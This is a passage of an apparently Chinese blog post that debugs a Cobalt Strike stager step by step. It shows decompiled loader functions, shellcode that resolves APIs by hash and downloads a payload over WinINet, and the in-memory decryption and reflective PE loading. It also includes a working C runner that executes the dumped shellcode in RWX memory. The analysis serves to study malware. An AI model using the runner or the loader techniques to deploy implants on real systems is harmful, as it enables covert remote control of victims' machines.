<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_4015D0</span><span class="params">(<span class="type">char</span> *lpBuffer, <span class="type">signed</span> <span class="type">int</span> nNumberOfBytesToWrite)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *NamedPipeA; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [rsp+4Ch] [rbp-2Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/*调用将创建一个命名管道,该管道的名称为 Buffer，最多可以同时连接 2 个客户端,输出缓冲区大小为默认值,</span></span><br><span class="line"><span class="comment">输入缓冲区大小为 1 字节,使用默认的超时时间和安全属性。*/</span></span><br><span class="line">  NamedPipeA = CreateNamedPipeA(Buffer, <span class="number">2u</span>, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>i64);</span><br><span class="line">  result = NamedPipeA - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (NamedPipeA - <span class="number">1</span>) &lt;= <span class="number">0xFFFFFFFFFFFFFFFD</span>ui64 )<span class="comment">//检验管道是否创建成功</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = ConnectNamedPipe(NamedPipeA, <span class="number">0</span>i64);<span class="comment">//尝试连接到刚才创建的命名管道</span></span><br><span class="line">    <span class="keyword">if</span> ( result )<span class="comment">//判断连接是否成功</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( nNumberOfBytesToWrite &gt; <span class="number">0</span></span><br><span class="line">           &amp;&amp; WriteFile(NamedPipeA, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, <span class="number">0</span>i64) )<span class="comment">//</span></span><br><span class="line">      &#123;</span><br><span class="line">        nNumberOfBytesToWrite -= NumberOfBytesWritten;<span class="comment">//更新写入数据，减去已写入的字节数</span></span><br><span class="line">        lpBuffer += NumberOfBytesWritten;<span class="comment">//更新 lpBuffer 的地址,指向下一个要写入的位置</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> CloseHandle(NamedPipeA);<span class="comment">//关闭命名通道</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​<code>while (nNumberOfBytesToWrite &gt; 0 &amp;&amp; WriteFile(NamedPipeA, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, 0i64))</code>​</p>
<p>1、在连接成功的情况下,开始循环写入数据到管道。</p>
<p>2、<code>nNumberOfBytesToWrite</code>​ 要写入的字节数。</p>
<p>3、<code>lpBuffer</code>​ 要写入的数据缓冲区的地址。</p>
<p>4、<code>&amp;NumberOfBytesWritten</code>​ 用于记录实际写入的字节数。</p>
<p>5、<code>0i64</code>​ 表示使用默认的重叠 I&#x2F;O 参数。</p>
<p>‍</p>
<h4 id="sub-401742​函数"><a href="#sub-401742​函数" class="headerlink" title="sub_401742​函数"></a><code>sub_401742</code>​函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_401742</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v0; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">malloc</span>(nNumberOfBytesToRead);<span class="comment">//申请动态内存空间</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    <span class="title function_">Sleep</span><span class="params">(<span class="number">0x400</span>u)</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !sub_4016A2(v0, nNumberOfBytesToRead) );<span class="comment">//判断对Buffer的读取是否成功</span></span><br><span class="line">  sub_40152E(v0, nNumberOfBytesToRead, &amp;unk_404008);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>‍</p>
<h5 id="sub-4016A2​函数"><a href="#sub-4016A2​函数" class="headerlink" title="sub_4016A2​函数"></a><code>sub_4016A2</code>​函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_4016A2</span><span class="params">(<span class="type">char</span> *lpBuffer, <span class="type">signed</span> <span class="type">int</span> nNumberOfBytesToRead)</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE FileA; <span class="comment">// rsi</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  DWORD NumberOfBytesRead; <span class="comment">// [rsp+4Ch] [rbp-2Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  NumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">  FileA = CreateFileA(Buffer, <span class="number">0x80000000</span>, <span class="number">3u</span>, <span class="number">0</span>i64, <span class="number">3u</span>, <span class="number">0x80</span>u, <span class="number">0</span>i64);<span class="comment">//打开名叫Buffer的文件</span></span><br><span class="line">  result = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( FileA != <span class="number">-1</span>i64 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( nNumberOfBytesToRead &gt; <span class="number">0</span> &amp;&amp; ReadFile(FileA, lpBuffer, nNumberOfBytesToRead, &amp;NumberOfBytesRead, <span class="number">0</span>i64) )<span class="comment">//循环读取FileA 中的内容</span></span><br><span class="line">    &#123;</span><br><span class="line">      nNumberOfBytesToRead -= NumberOfBytesRead;</span><br><span class="line">      lpBuffer += NumberOfBytesRead;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(FileA);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​<code>FileA = CreateFileA(Buffer, 0x80000000, 3u, 0i64, 3u, 0x80u, 0i64);</code>​用于创建或打开文件。</p>
<ol>
<li>​<code>Buffer</code>​: 这个参数是一个字符串,代表要创建或打开的文件名。</li>
<li>​<code>0x80000000</code>​: 这是一个十六进制的文件访问标志,表示以读写模式打开文件。</li>
<li>​<code>3u</code>​: 这个参数是文件共享模式标志,表示允许文件被其他进程读取和写入。</li>
<li>​<code>0i64</code>​: 这个参数是文件属性标志,传0表示使用默认属性。</li>
<li>​<code>3u</code>​: 这个参数是文件创建选项标志,表示如果文件不存在则创建,如果存在则打开。</li>
<li>​<code>0x80u</code>​: 这个参数是文件属性和标志,表示以普通文件模式打开。</li>
<li>​<code>0i64</code>​: 这个参数是文件安全描述符,传0表示使用默认值。</li>
</ol>
<p>‍</p>
<p>R<code>eadFile(FileA, lpBuffer, nNumberOfBytesToRead, &amp;NumberOfBytesRead, 0i64)</code>​读取文件数据。</p>
<ol>
<li>​<code>FileA</code>​: 这是前面创建或打开文件时返回的文件句柄。</li>
<li>​<code>lpBuffer</code>​: 这是一个指针,指向存储读取数据的缓冲区。</li>
<li>​<code>nNumberOfBytesToRead</code>​: 这个参数指定要读取的字节数。</li>
<li>​<code>&amp;NumberOfBytesRead</code>​: 这是一个输出参数,用于存储实际读取的字节数。</li>
<li>​<code>0i64</code>​: 这是一个可选的重叠(overlapped)结构指针参数,在异步读取时使用。在这里传 <code>0i64</code>​ 表示使用同步读取模式。</li>
</ol>
<p>‍</p>
<p>总的来说这个函数实现了从Buffer中读取数据并存储到指定缓冲区的操作</p>
<p>‍</p>
<h4 id="sub-40152E​函数"><a href="#sub-40152E​函数" class="headerlink" title="sub_40152E​函数"></a><code>sub_40152E</code>​函数</h4><p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240802164415-vbkq86b.png" alt="image" loading="lazy">​</p>
<p>申请了一个a2大小的空间给变量v7</p>
<p>参数a1指向的数据和a3指向的数据以特定的顺序进行异或运算，然后赋值给了v7指定的空间中</p>
<p>​<code>sub_4014F3</code>​函数是将<code>GetModuleHandleA</code>​函数与<code>GetProcAddress</code>​函数地址存到指定地址</p>
<p>将地址为 <code>v7</code>​、大小为 <code>v3</code>​ 字节的内存块的访问保护属性修改为允许读、写和执行。</p>
<p>返回入口点为StartAddress的进程</p>
<p>‍</p>
<h5 id="sub-4014F3​函数"><a href="#sub-4014F3​函数" class="headerlink" title="sub_4014F3​函数"></a><code>sub_4014F3</code>​函数</h5><p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240802171736-gwc442d.png" alt="image" loading="lazy">​</p>
<p>前面分析了这个函数，大致作用</p>
<p>‍</p>
<h5 id="StartAddress​函数"><a href="#StartAddress​函数" class="headerlink" title="StartAddress​函数"></a><code>StartAddress</code>​函数</h5><p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240802171856-xzeii6y.png" alt="image" loading="lazy">​</p>
<p>一个简单返回lpThreadParameter指针所指地址的函数</p>
<p>‍</p>
<p>静态分析完成main函数大致逻辑</p>
<p>‍</p>
<h1 id="shellcode分析"><a href="#shellcode分析" class="headerlink" title="shellcode分析"></a>shellcode分析</h1><h2 id="远端shellcode加载"><a href="#远端shellcode加载" class="headerlink" title="远端shellcode加载"></a>远端shellcode加载</h2><h3 id="获取模块基址"><a href="#获取模块基址" class="headerlink" title="获取模块基址"></a>获取模块基址</h3><p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240805135225-okrqgj3.png" alt="image" loading="lazy">​</p>
<p>进入shellcode之后，发现有call loc_200D2，步入观察</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240805135726-uatq7us.png" alt="image" loading="lazy">​</p>
<p>将74656E696E6977h存储到r14寄存器中，并将r14入栈，其中74656E696E6977h是wininet的特征码</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240805135857-dpnz6c0.png" alt="image" loading="lazy">​</p>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/wininet/about-wininet">Windows Internet (WinINet) 应用程序编程接口 (API) 使应用程序能够与 FTP 和 HTTP 协议进行交互以访问 Internet 资源。 随着标准的发展，这些函数处理基础协议中的更改，使它们能够保持一致的行为。</a></p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240805181906-41eeqw7.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<p>使用遍历PEB模块链表加载模块</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240808124111-ppmadoq.png" alt="image" loading="lazy">​</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">debug025:<span class="number">0000000000020014</span> mov     rdx, gs:[rdx+<span class="number">60</span>h] <span class="comment">//找到PEB结构体</span></span><br><span class="line">debug025:<span class="number">0000000000020019</span> mov     rdx, [rdx+<span class="number">18</span>h]	<span class="comment">//Ldr</span></span><br><span class="line">debug025:<span class="number">000000000002001</span>D mov     rdx, [rdx+<span class="number">20</span>h]	<span class="comment">//LIST_ENTRY InMemoryOrderModuleList;   </span></span><br><span class="line">debug025:<span class="number">0000000000020021</span> mov     rsi, [rdx+<span class="number">50</span>h]	<span class="comment">//模块名称</span></span><br><span class="line">debug025:<span class="number">0000000000020025</span> movzx   rcx, word ptr [rdx+<span class="number">4</span>Ah]	<span class="comment">//模块名称长度</span></span><br></pre></td></tr></table></figure>

<p>‍</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240808125559-zhgrtsq.png" alt="image" loading="lazy">​</p>
<p>rsi指向了这个程序本身也就是之前为这个程序取的t.exe</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">debug031:<span class="number">000000000002002</span>D loc_2002D:                              ; CODE XREF: debug031:<span class="number">000000000002003</span>E↓j</span><br><span class="line">debug031:<span class="number">000000000002002</span>D                 xor     rax, rax</span><br><span class="line">debug031:<span class="number">0000000000020030</span>                 lodsb						<span class="comment">//从 RSI 指向的缓冲区中读取一个字节到 AL 寄存器</span></span><br><span class="line">debug031:<span class="number">0000000000020031</span>                 cmp     al, <span class="number">61</span>h ; <span class="string">&#x27;a&#x27;</span>		<span class="comment">//检查读取的字节是否小于 &#x27;a&#x27;</span></span><br><span class="line">debug031:<span class="number">0000000000020033</span>                 jl      <span class="type">short</span> loc_20037	<span class="comment">//如果小于 &#x27;a&#x27;，跳转到 loc_20037</span></span><br><span class="line">debug031:<span class="number">0000000000020035</span>                 sub     al, <span class="number">20</span>h ; <span class="string">&#x27; &#x27;</span>		<span class="comment">//大于就转换为大写字母</span></span><br><span class="line">debug031:<span class="number">0000000000020037</span></span><br><span class="line">debug031:<span class="number">0000000000020037</span> loc_20037:                              ; CODE XREF: debug031:<span class="number">0000000000020033</span>↑j</span><br><span class="line">debug031:<span class="number">0000000000020037</span>                 ror     r9d, <span class="number">0</span>Dh			<span class="comment">//将 R9D 寄存器中的值向右循环移位 13 位</span></span><br><span class="line">debug031:<span class="number">000000000002003B</span>                 add     r9d, eax			<span class="comment">//将当前字节的值加到 R9D 寄存器中</span></span><br><span class="line">debug031:<span class="number">000000000002003</span>E                 loop    loc_2002D			<span class="comment">//循环次数就是模块长度</span></span><br><span class="line">debug031:<span class="number">0000000000020040</span>                 push    rdx</span><br><span class="line">debug031:<span class="number">0000000000020041</span>                 push    r9</span><br></pre></td></tr></table></figure>

<p>这里就是计算每个模块名称的哈希值,并将结果存储在 R9 寄存器中</p>
<p>‍</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240808144752-a5syb6m.png" alt="image" loading="lazy">​</p>
<p>直接打断点跳转到结束语句，查看rsi寄存器</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240808145321-yto8c8h.png" alt="image" loading="lazy">​</p>
<p>​<code>LoadLibraryExA</code>​ 是 Windows 系统中的一个 API 函数,用于动态加载 DLL 库。</p>
<p>​<code>LoadLibraryExA</code>​函数去调用了winiet</p>
<p>总结：通过双向链表指向进程装载的模块，然后通过HASH API寻址，然后将LoadLibraryExA函数的地址存入RAX等待调用</p>
<p><a target="_blank" rel="noopener" href="https://green-m.me/2018/04/26/find-api-adress-by-hash/">通过Hash查找API函数地址 (green-m.me)</a></p>
<p>‍</p>
<h3 id="加载功能函数"><a href="#加载功能函数" class="headerlink" title="加载功能函数"></a>加载功能函数</h3><p>因为rax中存的是kernelbase_LoadLibraryA函数</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240808205728-pqlk76d.png" alt="image" loading="lazy">​</p>
<p>步入查看详细逻辑</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240808210039-31cdvyy.png" alt="image" loading="lazy">​</p>
<p>这段代码实现了一个 <code>kernelbase_LoadLibraryA</code>​ 函数,它在加载 DLL 时会先检查是否为 “twain_32.dll”,如果是则尝试从 Windows 目录下加载。如果加载失败或者 DLL 名称不是 “twain_32.dll”,则直接调用 <code>kernelbase_LoadLibraryExA</code>​ 函数进行加载。</p>
<p>直接跳出<code>kernelbase_LoadLibraryA</code>​函数，继续分析当前指令</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240808221834-vwqav5w.png" alt="image" loading="lazy">​</p>
<p>0A779563Ah新的特征值，一直运行到call rbp 观察rbp发现存的地址是0x000000000002000A，跳转回去，直接运行到</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240808225600-cam3uhw.png" alt="image" loading="lazy">​</p>
<p>A779563Ah-&gt;winiet_InternetOpenA</p>
<p>​<code>winiet_InternetOpenA</code>​函数用于打开一个 Internet 连接的 API 函数</p>
<p>继续调试发现同样的规律，有点类似于c语言中的<code>switch</code>​（）<code>case</code>​语句</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240808230735-4ba6bfo.png" alt="image" loading="lazy">​</p>
<p>照相同手法调试发现</p>
<p>0C69F8957h–&gt;wininet_InternetConnectA</p>
<p>3B2E55EBh-&gt;wininet_HttpOpenRequestA</p>
<p>7B18062Dh-&gt;wininet_HttpSendRequestA(这个会多次循环，需要打开cs，调试到这里时cs中靶机就成功上线了）</p>
<p>E553A458h-&gt;kernel32_VirtualAlloc（调试这个的时候可能出现内存访问错误，打开cs之后再进行调试）</p>
<p>E2899612h-&gt;wininet_InternetReadFile</p>
<p>这些函数一起使用的效果就是发送HTTP请求接收并响应，然后分配一个虚拟内存，并Internet 连接中读取数据存到刚才的虚拟内存中</p>
<p>‍</p>
<h3 id="远程文件读取"><a href="#远程文件读取" class="headerlink" title="远程文件读取"></a>远程文件读取</h3><p>  前面三个函数是为了发送Http请求，主要分析后两个函数查看wininet_InternetReadFile的执行过程获取远程文件的保存位置</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240809192242-f83bqfa.png" alt="image" loading="lazy">​</p>
<p>​<code>kernelbase_VirtualAlloc</code>​函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LPVOID <span class="title function_">kernelbase_VirtualAlloc</span><span class="params">(</span></span><br><span class="line"><span class="params">  LPVOID lpAddress,<span class="comment">//要分配的虚拟内存地址,如果为NULL,系统会自动选择一个合适的地址。</span></span></span><br><span class="line"><span class="params">  SIZE_T dwSize,<span class="comment">//要分配的虚拟内存大小,以字节为单位。</span></span></span><br><span class="line"><span class="params">  DWORD  flAllocationType,<span class="comment">//内存分配的类型,可以是MEM_COMMIT、MEM_RESERVE或它们的组合。</span></span></span><br><span class="line"><span class="params">  DWORD  flProtect<span class="comment">//内存页面的保护属性,如PAGE_READWRITE、PAGE_EXECUTE_READWRITE等。</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>四个参数，找到申请是空间地址</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810200253-thzdm8i.png" alt="image" loading="lazy">​</p>
<p>lpAddress&#x3D;0014F9D8h ;申请开辟内存空间首地址</p>
<p>dwSize&#x3D;400000 ;申请内存空间大小</p>
<p>flAllocationType&#x3D;1000 ;申请内存类型</p>
<p>flProtect&#x3D;40 ;内存保护类型</p>
<p>跳转返回，查看下一个函数</p>
<p>​<code>wininet_InternetReadFile</code>​是Windows系统中 WinInet API 提供的一个函数,用于从 Internet 连接中读取数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">wininet_InternetReadFile</span><span class="params">(</span></span><br><span class="line"><span class="params">  HINTERNET hFile,<span class="comment">// 函数返回的有效的 Internet 句柄。</span></span></span><br><span class="line"><span class="params">  LPVOID    lpBuffer,<span class="comment">//指向用于存储读取数据的缓冲区的指针。</span></span></span><br><span class="line"><span class="params">  DWORD     dwNumberOfBytesToRead,<span class="comment">//要读取的最大字节数。</span></span></span><br><span class="line"><span class="params">  LPDWORD   lpdwNumberOfBytesRead<span class="comment">//接收实际读取字节数的指针。</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>一个标准的wininet_InternetReadFile函数，没什么好看的，直接跳转返回</p>
<p>进行了循环读取</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810201107-mryu0ps.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<p>‍</p>
<h3 id="内存动态解密"><a href="#内存动态解密" class="headerlink" title="内存动态解密"></a>内存动态解密</h3><p>文件读取完毕，将会跳转到文件内存存储地址</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810201336-bijlsrc.png" alt="image" loading="lazy">​</p>
<p>观察rax和rbx发现文件起始位置是0x032F0000，文件结束位置是0x03330447，计算得文件大小为0x40447，</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810202603-r1im9gx.png" alt="image" loading="lazy">​</p>
<p>存在加密，貌似是smc，调试自解密，起始地址为0x0324003F；直接p强制识别为函数，看伪代码</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810203336-pzj6o0k.png" alt="image" loading="lazy">​</p>
<p>直接跳转到解密结束，rax指向了0x03410047，使用x64dbg dump出来</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810211435-j7uhckr.png" alt="image" loading="lazy">​</p>
<p>这里使用x64 dump的时候运行程序崩了，所以直接使用ida中的idc脚本进行dump</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">auto</span> fp, begin, end, dexbyte;</span><br><span class="line">fp = fopen(<span class="string">&quot;MEM_00000000029B0047_00040400.mem&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">begin = <span class="number">0x3300047</span>;</span><br><span class="line">end = begin + <span class="number">40400</span>;</span><br><span class="line"><span class="keyword">for</span> ( dexbyte = begin; dexbyte &lt; end; dexbyte ++ )</span><br><span class="line">fputc(Byte(dexbyte), fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将dump出来的文件进行重编译</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">HANDLE hfile = CreateFileA(<span class="string">&quot;MEM_00000000029B0047_00040400.mem&quot;</span>,</span><br><span class="line">FILE_ALL_ACCESS, <span class="number">0</span>, <span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">LPVOID buffer = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">0x4000000</span>, MEM_COMMIT,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line">DWORD realRead = <span class="number">0</span>;</span><br><span class="line">ReadFile(hfile, buffer, <span class="number">0x4000000</span>, &amp;realRead, <span class="literal">NULL</span>);</span><br><span class="line">((<span class="type">void</span>(*)())buffer)();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试上线成功</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810221342-lcva82k.png" alt="image" loading="lazy">​</p>
<p>使用ida反编译</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810221408-phcs4j7.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<p>‍</p>
<h2 id="远端文件装载"><a href="#远端文件装载" class="headerlink" title="远端文件装载"></a>远端文件装载</h2><p>这一阶段程序将重装载从远程下载的PE文件，约定称重装载前为源PE文件，重装载后为新PE文件</p>
<h3 id="内存文件基址的定位"><a href="#内存文件基址的定位" class="headerlink" title="内存文件基址的定位"></a>内存文件基址的定位</h3><p>继续刚才的shellcode分析，单步进入，之后ida会将刚才的数据转换为汇编，或则在步入之前点击c键强制转换也可以</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810232814-644y6wq.png" alt="image" loading="lazy">​</p>
<p>call 这里步入</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810233459-ego19c5.png" alt="image" loading="lazy">​</p>
<p>这里进行了一些栈空间的清理工作，然后继续步入loc_3316413</p>
<p>看到一个loc_3316393，这里只是从栈上读取一个值到 RAX 寄存器中，快速步过</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810234521-qvv8emo.png" alt="image" loading="lazy">​</p>
<p>程序在寻找4D5Ah和4500h，这是DOS文件头与NT头的标志，即在进行PE文件的定位</p>
<p>直接跳转到ret返回</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">debug078:<span class="number">000000000331619B</span>                 call    loc_3316413</span><br><span class="line">debug078:<span class="number">00000000033161</span>A0                 mov     [rsp+<span class="number">50</span>h], rax</span><br><span class="line">debug078:<span class="number">00000000033161</span>A5                 mov     eax, [rsp+<span class="number">70</span>h]</span><br><span class="line">debug078:<span class="number">00000000033161</span>A9                 and     eax, offset unk_FFFFFF</span><br><span class="line">debug078:<span class="number">00000000033161</span>AE                 cmp     eax, offset unk_414141</span><br><span class="line">debug078:<span class="number">00000000033161B</span>3                 jnz     <span class="type">short</span> loc_33161CF</span><br><span class="line">debug078:<span class="number">00000000033161B</span>5                 mov     eax, [rsp+<span class="number">78</span>h]</span><br><span class="line">debug078:<span class="number">00000000033161B</span>9                 and     eax, offset unk_FFFFFF</span><br><span class="line">debug078:<span class="number">00000000033161B</span>E                 cmp     eax, offset unk_424242</span><br><span class="line">debug078:<span class="number">00000000033161</span>C3                 jnz     <span class="type">short</span> loc_33161CF</span><br><span class="line">debug078:<span class="number">00000000033161</span>C5                 lea     rcx, [rsp+<span class="number">70</span>h]</span><br><span class="line">debug078:<span class="number">00000000033161</span>CA                 call    loc_33164A3 </span><br></pre></td></tr></table></figure>

<p>这里同样还在进行检索，步入loc_33164A3</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240810235117-w88vhy9.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<h3 id="获取模块基址-1"><a href="#获取模块基址-1" class="headerlink" title="获取模块基址"></a>获取模块基址</h3><p>又进行了模块寻址的过程，并将其存储到栈中备用 并在检查是否拿到链表指针后</p>
<p>接续执行，发现特征码6A4ABC5Bh，打上断点到跳过这一寻找过程，可知现在找到的是kernel32模块（通过查看rax寄存器</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811000001-lq218fu.png" alt="image" loading="lazy">​</p>
<p>​<img src="/../imge/CobaltStrike%E5%8A%A8%E8%B0%83/assets/image-20240811001509-iw20xtk.png" alt="image" loading="lazy">​</p>
<p>进行了和前面提到的hash api寻址一样的操作，找到功能函数</p>
<p>‍</p>
